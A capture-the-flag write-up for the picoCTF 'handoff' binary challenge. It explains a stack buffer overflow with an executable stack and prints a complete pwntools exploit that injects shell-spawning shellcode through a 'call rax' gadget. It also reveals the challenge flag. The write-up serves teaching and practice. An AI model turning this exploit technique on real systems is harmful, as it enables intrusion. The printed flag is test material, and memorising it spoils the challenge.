# Handoff - Writeup

First, inspecting `handoff.c`, we notice that we have a buffer overflow in `feedback`
which occurs as soon as you exit the program.
The `feedback` variable is 8 bytes, and we get to read `NAME_LEN` = 32 bytes.
Notice that this means that we get to overflow the following:
8 bytes `feedback`, 8 bytes \$rbp, 8 bytes \$rip, and 8 more bytes
(we do need a null byte at the end).

Also, running checksec, we get:

```
[*] '/home/jayjay/dev2/ctf/2025/picoctf/handoff/handoff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Notice in particular, there is *no stack canary*, *no PIE*, and most importantly,
stack is executable. 

Now, we look for gadgets. There aren't that many useful gadgets,
and we can't build a ROP chain anyway, but here is a useful one:

`0x0000000000401014 : call rax`

So how can we change \$rax? Well, fgets will return the address
of the buffer `feedback` in \$rax, which is not changed. How convenient!

So our payload is gonna look like this:

`[some instructions] [garbage] [call rax]`

Too bad we don't have a lot of space in our payload. But we control
the memory at entries, so we can use that space. We can inject shellcode
there and then relative jmp (2 bytes) into our entries. Of course, this all works because
the stack is executable.

Also, I used a NOP sled in entries because it was convenient (less thinking, yayy!).

Exploit code:

```python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template handoff --host shape-facility.picoctf.net --port 51346
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'handoff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'shape-facility.picoctf.net'
port = int(args.PORT or 49337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *(vuln+485)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

rop = ROP(exe)

for i in range(10):
    io.sendline(b"1")
    io.send(b"\xc0"+b"\x90"*0x1e)
    io.sendline(b"2")
    io.sendline(str(i).encode("ascii"))
    io.send(b"\xc0"+b"\x90"*0x3e)
io.sendline(b"2")
io.sendline(b"9")
io.sendline(asm("sub rsp, 0x80\n" + shellcraft.sh()));

io.sendline(b"3")
io.sendline(fit({0:0x41424344454680eb, 20: 0x0000000000401014}))

io.interactive()
```


This gets the flag! `picoCTF{p1v0ted_ftw_440a61fe}`
